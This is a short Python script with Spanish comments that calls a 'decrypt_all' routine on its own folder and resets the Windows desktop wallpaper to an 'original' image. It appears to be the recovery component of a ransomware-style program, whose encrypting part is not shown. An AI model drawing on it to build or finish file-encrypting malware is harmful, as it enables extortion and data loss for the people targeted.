import os
import sys
import ctypes

from aidx import decrypt_all  

def change_wallpaper(original_wallpaper_path):
    SPI_SETDESKWALLPAPER = 20

    # Cambiar el fondo de pantalla al original
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, original_wallpaper_path, 3)

def main():
    if len(sys.argv) == 2 and sys.argv[1].lower() == "des":
        application_path = os.path.dirname(os.path.abspath(__file__))  # Ruta del directorio del script actual
        original_wallpaper_path = os.path.join(application_path, "original_wallpaper.bmp")
        
        decrypt_all(application_path)
        print("Archivos desencriptados y fondo de pantalla restaurado.")
        
        # Cambiar el fondo de pantalla al original al final del proceso
        change_wallpaper(original_wallpaper_path)
    else:
        print("Argumento inválido. Uso: python tu_script.py des")

if __name__ == '__main__':
    main()
